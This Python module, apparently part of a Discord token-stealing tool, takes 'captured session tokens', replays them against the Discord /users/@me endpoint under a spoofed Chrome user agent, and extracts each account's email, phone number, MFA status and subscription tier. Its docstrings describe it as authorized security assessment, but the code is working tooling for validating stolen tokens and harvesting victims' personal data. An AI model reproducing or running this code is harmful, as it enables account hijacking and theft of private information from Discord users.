"""Authorized API data extraction for captured session tokens."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any

import aiohttp

from config import settings

logger = logging.getLogger(__name__)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


@dataclass
class UserProfile:
    """Subset of /users/@me fields relevant to security assessment."""

    id: str
    username: str
    global_name: str | None
    email: str | None
    verified: bool | None
    mfa_enabled: bool
    phone: str | None
    premium_type: int

    @classmethod
    def from_api(cls, data: dict[str, Any]) -> UserProfile:
        return cls(
            id=str(data.get("id", "")),
            username=str(data.get("username", "")),
            global_name=data.get("global_name"),
            email=data.get("email"),
            verified=data.get("verified"),
            mfa_enabled=bool(data.get("mfa_enabled")),
            phone=data.get("phone"),
            premium_type=int(data.get("premium_type") or 0),
        )

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "username": self.username,
            "global_name": self.global_name,
            "email": self.email,
            "verified": self.verified,
            "mfa_enabled": self.mfa_enabled,
            "phone": self.phone,
            "premium_type": self.premium_type,
        }


async def fetch_user_profile(token: str) -> UserProfile:
    """Validate a captured token and retrieve the authorized @me profile."""
    url = f"{settings.discord_api_base}/users/@me"
    headers = {
        "Authorization": token,
        "User-Agent": DEFAULT_USER_AGENT,
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as resp:
            body = await resp.text()
            if resp.status != 200:
                logger.error("Profile fetch failed HTTP %s: %s", resp.status, body[:200])
                raise ValueError(f"API returned HTTP {resp.status}")

            data = await resp.json()
            profile = UserProfile.from_api(data)
            logger.info("Fetched profile for user %s (%s)", profile.username, profile.id)
            return profile
